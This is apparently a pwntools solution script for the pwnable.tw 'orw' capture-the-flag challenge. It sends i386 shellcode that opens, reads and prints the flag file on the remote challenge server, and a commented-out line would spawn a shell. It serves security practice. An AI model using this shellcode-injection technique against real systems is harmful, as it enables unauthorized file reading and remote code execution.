from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
#io = process('./orw')
io = remote('chall.pwnable.tw',10001)
#io = gdb.debug('./orw')
#shellcode = asm(shellcraft.sh())
shellcode = shellcraft.open('/home/orw/flag')+shellcraft.read('eax','esp',100)+shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)
io.sendlineafter(b'Give my your shellcode:',shellcode)
io.interactive()

